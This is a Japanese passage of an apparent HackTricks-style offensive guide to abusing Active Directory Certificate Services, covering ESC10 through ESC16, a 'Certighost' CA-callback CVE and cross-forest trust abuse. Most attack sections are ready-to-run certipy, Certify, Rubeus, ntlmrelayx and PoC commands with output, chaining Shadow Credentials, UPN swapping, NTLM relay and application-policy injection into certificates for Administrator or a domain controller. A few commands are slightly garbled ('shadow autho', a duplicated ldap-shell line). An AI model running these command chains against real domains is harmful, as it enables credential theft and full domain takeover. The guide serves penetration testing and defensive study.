まず、`GenericWrite` を悪用して Shadow Credentials により `Jane` のhashを取得します。
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
その後、`Jane` の `userPrincipalName` は `Administrator` に変更され、制約違反を避けるために `@corp.local` の部分は意図的に省略されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
これに続いて、デフォルトの `User` template を使用し、client authentication を有効にする certificate が `Jane` として要求されます。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` の `userPrincipalName` はその後、元の `Jane@corp.local` に戻されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
取得した証明書で認証すると、`Administrator@corp.local` の NT hash が得られます。証明書に domain の詳細が含まれていないため、コマンドで domain を指定する必要があります。
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Abuse Case 2

`CertificateMappingMethods` に `UPN` ビットフラグ（`0x4`）が含まれている場合、`GenericWrite` 権限を持つアカウント A は、`userPrincipalName` プロパティを持たない任意のアカウント B を侵害できます。これには、マシンアカウントや組み込みドメイン管理者である `Administrator` も含まれます。

ここでは、`GenericWrite` を利用し、Shadow Credentials を通じてまず `Jane` の hash を取得して、`DC$@corp.local` を侵害することが目的です。
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane` の `userPrincipalName` はその後 `DC$@corp.local` に設定されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
デフォルトの `User` template を使用して、クライアント認証用の証明書が `Jane` として要求されます。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` の `userPrincipalName` は、このプロセス後に元の値へ戻されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannel経由で認証するため、Certipyの`-ldap-shell`オプションを使用し、`u:CORP\DC$`として認証に成功したことを示します。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP shellを通じて、`set_rbcd` などのコマンドでResource-Based Constrained Delegation（RBCD）攻撃を実行でき、ドメインコントローラーを侵害できる可能性があります。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
この脆弱性は、`userPrincipalName` を持たないユーザーアカウント、または `userPrincipalName` が `sAMAccountName` と一致しないユーザーアカウントにも影響します。デフォルトの `Administrator@corp.local` は、昇格された LDAP 権限を持ち、デフォルトでは `userPrincipalName` が存在しないため、特に有力な標的です。

## Relaying NTLM to ICPR - ESC11

### 説明

CA Server が `IF_ENFORCEENCRYPTICERTREQUEST` で設定されていない場合、RPC service 経由で署名なしの NTLM relay attacks を実行できます。[Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

`certipy` を使用して `Enforce Encryption for Requests` が Disabled かどうかを列挙できます。Disabled の場合、certipy は `ESC11` Vulnerabilities を表示します。
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Abuse Scenario

relay server をセットアップする必要があります:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
注: domain controllers の場合、DomainController で `-template` を指定する必要があります。

または、[sploutchy's fork of impacket](https://github.com/sploutchy/impacket) を使用します:
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Explanation

Administrators は、Certificate Authority を「Yubico YubiHSM2」のような外部デバイスに保存するよう設定できます。

USB デバイスが USB ポート経由で CA server に接続されている場合、または CA server が virtual machine の場合に USB device server が接続されている場合、YubiHSM 内の keys を Key Storage Provider が生成して利用するには、authentication key（「password」と呼ばれることもあります）が必要です。

この key/password は、registry の `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` に cleartext で保存されています。

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Abuse Scenario

CA の private key が physical USB device に保存されている場合、shell access を取得すると、その key を復元できます。

まず、CA certificate（これは public です）を取得し、次に以下を実行します。
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
最後に、certutil の `-sign` コマンドを使用して、CA 証明書とその秘密鍵によって任意の新しい証明書を偽造します。

## OID Group Link Abuse - ESC13

### 説明

`msPKI-Certificate-Policy` 属性を使用すると、発行ポリシーを証明書テンプレートに追加できます。発行ポリシーを管理する `msPKI-Enterprise-Oid` オブジェクトは、PKI OID コンテナーの Configuration Naming Context（CN=OID,CN=Public Key Services,CN=Services）で検出できます。ポリシーは、このオブジェクトの `msDS-OIDToGroupLink` 属性を使用して AD グループにリンクできます。これにより、証明書を提示したユーザーを、そのグループのメンバーであるかのようにシステムが認証できるようになります。[Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)。

つまり、ユーザーが証明書の enroll 権限を持ち、その証明書が OID グループにリンクされている場合、ユーザーはこのグループの権限を継承できます。

[Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) を使用して OIDToGroupLink を検索します：
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Abuse Scenario

`certipy find` または `Certify.exe find /showAllPermissions` を使用して、利用可能な user permission を見つけます。

`John` が `VulnerableTemplate` に enroll する permission を持っている場合、その user は `VulnerableGroup` group の privileges を継承できます。

必要なのは template を指定することだけで、OIDToGroupLink rights を持つ certificate を取得できます。
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Vulnerable Certificate Renewal Configuration- ESC14

### 解説

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping の説明は非常に詳細です。以下は原文からの引用です。

ESC14 は、主に Active Directory のユーザーまたはコンピューターアカウントにある `altSecurityIdentities` attribute の誤用または安全でない設定によって発生する、「weak explicit certificate mapping」に起因する脆弱性に対処します。この multi-valued attribute により、管理者は認証目的で X.509 certificates を AD account に手動で関連付けることができます。この attribute に値が設定されると、これらの explicit mappings が既定の certificate mapping logic を上書きする可能性があります。既定の logic は通常、certificate の SAN に含まれる UPN または DNS names、あるいは `szOID_NTDS_CA_SECURITY_EXT` security extension に埋め込まれた SID に依存します。

「weak」mapping とは、`altSecurityIdentities` attribute 内で certificate を識別するために使用される string value が広範すぎる、容易に推測できる、一意ではない certificate fields に依存している、または簡単に spoof 可能な certificate components を使用している場合を指します。攻撃者が、privileged account に対してこのように弱く定義された explicit mapping の attributes に一致する certificate を取得または作成できる場合、その certificate を使用して該当 account として認証し、なりすますことができます。

潜在的に weak な `altSecurityIdentities` mapping strings の例は次のとおりです。

- 共通の Subject Common Name (CN) のみで mapping する: 例: `X509:<S>CN=SomeUser`。攻撃者は、より安全性の低い source から、この CN を持つ certificate を取得できる可能性があります。
- 特定の serial number や subject key identifier などによる追加の限定なしに、過度に汎用的な Issuer Distinguished Names (DNs) または Subject DNs を使用する: 例: `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`。
- 攻撃者が正当に取得または forge できる certificate（CA を compromise した場合、または ESC1 のような vulnerable template を発見した場合）で満たせる可能性がある、その他の予測可能な pattern や non-cryptographic identifiers を使用する。

`altSecurityIdentities` attribute は、次のようなさまざまな formats for mapping をサポートしています。

- `X509:<I>IssuerDN<S>SubjectDN`（完全な Issuer と Subject DN による mapping）
- `X509:<SKI>SubjectKeyIdentifier`（certificate の Subject Key Identifier extension value による mapping）
- `X509:<SR>SerialNumberBackedByIssuerDN`（serial number による mapping。Issuer DN によって暗黙的に限定される）- これは standard format ではなく、通常は `<I>IssuerDN<SR>SerialNumber` です。
- `X509:<RFC822>EmailAddress`（SAN の RFC822 name、通常は email address による mapping）
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey`（certificate の raw public key の SHA1 hash による mapping - 一般的に strong）

これらの mappings の security は、mapping string で使用される certificate identifiers の具体性、一意性、および cryptographic strength に大きく左右されます。Domain Controllers で strong certificate binding modes が有効になっている場合でも（主に SAN UPNs/DNS および SID extension に基づく implicit mappings に影響します）、設定不備のある `altSecurityIdentities` entry は、mapping logic 自体に欠陥があるか、許容範囲が広すぎる場合、なりすましへの直接的な経路となる可能性があります。
### Abuse Scenario

ESC14 は、Active Directory (AD) の **explicit certificate mappings**、特に `altSecurityIdentities` attribute を対象とします。この attribute が（意図的または misconfiguration により）設定されている場合、攻撃者は mapping に一致する certificates を提示することで、accounts になりすますことができます。

#### Scenario A: Attacker Can Write to `altSecurityIdentities`

**Precondition**: 攻撃者が target account の `altSecurityIdentities` attribute に対する write permissions、または target AD object に対して次のいずれかの permissions を付与する権限を持っていること:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Scenario B: Target Has Weak Mapping via X509RFC822 (Email)

- **Precondition**: target の altSecurityIdentities に weak X509RFC822 mapping が存在すること。攻撃者は victim の mail attribute を target の X509RFC822 name に一致するよう設定し、victim として certificate を enroll し、その certificate を使用して target として認証できます。
#### Scenario C: Target Has X509IssuerSubject Mapping

- **Precondition**: target の `altSecurityIdentities` に weak X509IssuerSubject explicit mapping が存在すること。攻撃者は victim principal の `cn` または `dNSHostName` attribute を、target の X509IssuerSubject mapping の subject に一致するよう設定できます。その後、攻撃者は victim として certificate を enroll し、その certificate を使用して target として認証できます。
#### Scenario D: Target Has X509SubjectOnly Mapping

- **Precondition**: target の `altSecurityIdentities` に weak X509SubjectOnly explicit mapping が存在すること。攻撃者は victim principal の `cn` または `dNSHostName` attribute を、target の X509SubjectOnly mapping の subject に一致するよう設定できます。その後、攻撃者は victim として certificate を enroll し、その certificate を使用して target として認証できます。
### 具体的な操作
#### Scenario A

certificate template `Machine` の certificate を request する
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
証明書の保存と変換
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
認証（証明書を使用）
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
クリーンアップ（任意）
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
より具体的な攻撃シナリオにおける攻撃手法については、以下を参照してください: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0)。

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### 説明

https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc の説明は非常に詳細です。以下は原文からの引用です。

組み込みのデフォルト version 1 certificate templates を使用すると、攻撃者は CSR を作成し、template で指定された設定済みの Extended Key Usage attributes よりも優先される application policies を含めることができます。必要なのは enrollment rights のみであり、**_WebServer_** template を使用して client authentication、certificate request agent、および codesigning certificates を生成するために利用できます。

### Abuse

以下は [このリンク]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) を参照しています。詳細な使用方法を確認するにはクリックしてください。


CA にパッチが適用されていない場合、Certipy の `find` command を使用して、ESC15 の影響を受ける可能性がある V1 templates を特定できます。
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Schannel経由の直接偽装

**Step 1: 「Client Authentication」Application Policyと対象のUPNを注入して、certificateを要求する。** Attacker `attacker@corp.local`は、enrollee-supplied subjectを許可する「WebServer」V1 templateを使用して、`administrator@corp.local`を対象にする。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: 「Enrollee supplies subject」が設定された脆弱な V1 template。
- `-application-policies 'Client Authentication'`: CSR の Application Policies extension に OID `1.3.6.1.5.5.7.3.2` を注入します。
- `-upn 'administrator@corp.local'`: impersonation 用に SAN の UPN を設定します。

**Step 2: 取得した certificate を使用して Schannel（LDAPS）経由で Authenticate します。**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: Enrollment Agent Abuse による PKINIT/Kerberos Impersonation

**Step 1: 「Enrollee supplies subject」を設定した V1 template から、`Certificate Request Agent` Application Policy を注入して certificate を要求する。** この certificate は、攻撃者（`attacker@corp.local`）が enrollment agent になるためのものです。ここでは攻撃者自身の identity に対する UPN は指定しません。目的は agent capability を得ることだからです。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1` を注入します。

**Step 2: "agent" certificate を使用して、対象の privileged user に代わって certificate を要求します。** これは ESC3 に似た手順で、Step 1 の certificate を agent certificate として使用します。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**ステップ3: 「on-behalf-of」証明書を使用して、特権ユーザーとして認証する。**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## CA で Security Extension が無効（グローバル）-ESC16

### 説明

**ESC16（szOID_NTDS_CA_SECURITY_EXT Extension の欠落による Elevation of Privilege）**とは、AD CS の設定で、すべての証明書に **szOID_NTDS_CA_SECURITY_EXT** Extension を含めることが強制されていない場合に、攻撃者が次のように悪用できるシナリオを指します。

1. **SID binding なし**で証明書を要求する。

2. この証明書を使用して、任意のアカウントとして認証する。たとえば、高い権限を持つアカウント（Domain Administrator など）になりすます。

詳細な原理については、次の記事も参照してください：https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Abuse

以下は、[このリンク](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)を参照しています。詳細な使用方法を確認するには、クリックしてください。

Active Directory Certificate Services（AD CS）環境が **ESC16** に対して脆弱かどうかを特定するには
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Step 1: 被害者アカウントの初期UPNを読み取る（任意 - 復元用）。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Step 2: 被害者アカウントのUPNを、対象管理者の`sAMAccountName`に更新します。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Step 3: （必要な場合）「victim」アカウントのcredentialsを取得する（例：Shadow Credentials経由）。**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Step 4: ESC16-vulnerable CA 上の _any suitable client authentication template_（例: "User"）から、"victim" user として証明書を要求します。** CA は ESC16 に対して脆弱であるため、この拡張機能に関する template 固有の設定にかかわらず、発行される証明書から SID security extension が自動的に省略されます。Kerberos credential cache の環境変数を設定します（shell command）：
```bash
export KRB5CCNAME=victim.ccache
```
次に、証明書を要求します:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Step 5: 「victim」アカウントのUPNを元に戻す。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**手順 6: 対象の管理者として認証する。**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### 説明

**Certighost** は、CA が requester-supplied request attributes を信頼して、発行する証明書に設定する identity を解決する **AD CS enrollment chase / callback path** を悪用します。公開 PoC では、細工した request に以下が含まれます。

- **`cdc`**: CA が接続する attacker-controlled host/IP
- **`rmd`**: impersonate する **target Domain Controller DNS name**

CA がこの chase に従うと、**SMB/LSA (`445`)** および **LDAP (`389`)** 経由で attacker に接続します。attacker は、通常はデフォルトの **`ms-DS-MachineAccountQuota`** により作成した **real machine account** を使用します。これにより callback session は有効な domain principal として認証されますが、rogue services は代わりに **target DC** の identity attributes を返します。

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

CA が **returned identity を authenticated callback principal に cryptographically bind していない**場合、session が attacker-controlled machine account として認証されていても、**Domain Controller** 用の証明書を発行できます。この点で、この bug は概念的に **Certifried** とは異なります。Certifried が `dNSHostName` などの AD attributes を書き換えるのに対し、attacker は **CA callback resolution 中に identity data を置き換えます**。

**Useful preconditions:**

- Low-privileged **domain credentials**
- **computer account** を作成または再利用する能力
- **CA** から attacker-controlled **ports `389` および `445`** への network reachability
- Vulnerable / unpatched CA request path（**July 14, 2026** の Microsoft update により **`cdc` に対する DC validation** と **resolved-SID comparison** が追加されました）

生成された **`.pfx`** は **PKINIT** に使用でき、**`.ccache`** と、公開された PoC flow では **target DC NT hash** を取得できます。通常、これは **full domain compromise** に十分です。

### Abuse

公開 PoC は chain 全体を自動化します。

1. Attacker-controlled **machine account** を作成または再利用する。
2. `389` および `445` で **rogue LDAP and SMB/LSA listeners** を起動する。
3. Attacker-controlled **`cdc`** と target **`rmd`** attributes を含む certificate request を送信する。
4. CA が controlled machine account として rogue listeners に認証するのを待ち、identity lookups には **target DC** の attributes を返す。
5. CA-signed **DC certificate** を受け取り、それを **PKINIT** に使用する。
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
PoCで使用できる便利なruntime flags:

- `--listener <ip>`: `cdc` で通知されるcallback IPを明示的に選択する
- `--computer-name <NAME$>`: 新規作成する代わりに、既存のmachine accountを再利用する

**運用上の注意:**

- PoCは、**privileged ports** `389` と `445` にbindするため、**root** が必要となる。
- Exploitationに成功すると、**DC `.pfx`** と **Kerberos `.ccache`** がローカルに書き込まれる。
- 証明書は **Domain Controller account** にmapされるため、その後のアクションとして、**certificate-based Kerberos auth**、**DCSync**、および復元された **machine NT hash** の再利用が可能となる。

## 証明書によるForestのCompromisingをPassive Voiceで解説

### Compromised CAによるForest TrustのBreaking

**cross-forest enrollment** の設定は、比較的容易に行えるようになっている。resource forestの **root CA certificate** は管理者によって **account forests** に **published** され、resource forestの **enterprise CA** certificatesは各account forestの `NTAuthCertificates` およびAIA containersに **added** される。この構成により、resource forestの **CA** には、PKIを管理する他のすべてのforestに対する完全なcontrolが与えられる。もしこのCAが **attackersによってcompromised** された場合、resource forestおよびaccount forestsのすべてのusers向けcertificatesが彼らによって **forged** され、forestのsecurity boundaryがbreakingされる可能性がある。

### Foreign Principalsに付与されたEnrollment Privileges

multi-forest environmentsでは、**Authenticated Usersまたはforeign principals**（Enterprise CAが所属するforestの外部にいるusers/groups）に **enrollmentおよびedit rights** を許可する **certificate templates** を **publish** するEnterprise CAsについて、注意が必要となる。\
trustを越えたauthenticationが行われると、ADによって **Authenticated Users SID** がuserのtokenに追加される。そのため、あるdomainが **Authenticated Users enrollment rights** を許可するtemplateを持つEnterprise CAを有している場合、別のforestのuserによってtemplateが **enrolled** される可能性がある。同様に、templateによって **enrollment rights** がforeign principalに明示的に付与されている場合、**cross-forest access-control relationship** が作成され、その結果、あるforestのprincipalが別のforestのtemplateに **enroll** できるようになる。

どちらのシナリオでも、一方のforestから別のforestへの **attack surface** の増大につながる。certificate templateの設定は、attackerによって悪用され、foreign domainで追加のprivilegesを取得される可能性がある。


## 参考資料

- [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [H0j3n - Certighost technical analysis](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
